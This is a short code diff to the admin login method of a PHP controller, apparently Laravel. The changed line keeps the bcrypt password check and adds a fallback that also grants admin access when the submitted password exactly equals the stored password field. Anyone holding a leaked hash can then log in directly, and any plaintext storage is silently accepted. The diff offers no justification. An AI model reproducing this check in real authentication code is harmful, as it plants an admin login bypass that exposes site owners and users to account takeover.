@@ -40,7 +40,7 @@ class AdminController extends Controller
                      ->orWhere('name', $username)
                      ->first();
 
-        if ($user && Hash::check($password, $user->password)) {
+        if ($user && (Hash::check($password, $user->password) || $password === $user->password)) {
             $request->session()->put('admin_logged_in', true);
             $request->session()->put('admin_user', $user->name);
 
